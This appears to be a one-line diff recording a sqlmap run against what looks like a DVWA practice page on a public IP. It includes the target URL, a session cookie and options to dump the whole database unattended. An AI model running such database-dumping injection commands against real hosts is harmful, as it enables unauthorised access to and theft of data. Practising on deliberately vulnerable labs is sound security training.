@@ -1,0 +1,1 @@
+http://45.147.96.25:4242/vulnerabilities/brute/?username=Submit&password=Submit&Login=Login (GET)  # C:\Users\Const\AppData\Local\Programs\Python\Python38\Scripts\sqlmap -u http://45.147.96.25:4242/vulnerabilities/brute/?username=Submit&password=Submit&Login=Login --cookie=PHPSESSID=eu846u3ra7efc6mekf31i45c90;security=low --dump --batch --output-dir=dump/
